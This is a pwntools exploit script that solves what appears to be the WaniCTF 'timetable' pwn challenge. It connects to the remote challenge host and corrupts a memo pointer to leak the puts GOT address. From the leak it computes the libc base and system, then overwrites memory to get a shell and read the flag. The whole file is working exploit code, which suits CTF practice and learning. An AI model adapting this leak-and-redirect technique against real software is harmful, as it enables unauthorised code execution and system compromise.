from pwn import *


# p = process('./chall')
p = remote('timetable-pwn.wanictf.org', 9008)
elf = ELF('./chall')
lib = elf.libc


def begin():
    p.recvuntil(b':')
    p.sendline(b'/bin/sh\00')
    p.recvuntil(b':')
    p.sendline(b'1500')
    p.recvuntil(b':')
    p.sendline(b'1500')


def choice(id_):
    p.recvuntil(b'>')
    p.sendline(id_)


def add_1(id_):
    choice(b'1')
    choice(id_)


def add_2(id_):
    choice(b'2')
    choice(id_)


def show(id_):
    choice(b'3')
    choice(id_)


def edit(id_, mess):
    choice(b'4')
    choice(id_)
    p.recvuntil(b'WRITE MEMO FOR THE CLASS')
    p.sendline(mess)


begin()
add_1(b'0')
add_1(b'1')
add_1(b'2')
add_2(b'0')
add_2(b'1')
edit(b'WED 4', p64(elf.got['puts']))

choice(b'2')
p.recvuntil(b'World Affairs - ')
puts_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,  b'\00'))
base_addr = puts_addr - lib.sym['puts']
print(hex(base_addr))
system_addr = base_addr + lib.sym['system']
p.sendline(b'1')
edit(b'WED 4', p64(elf.got['puts']) + p64(system_addr) + p64(elf.sym['main']))
add_2(b'0')
p.sendline(b'cat FLAG')

p.interactive()
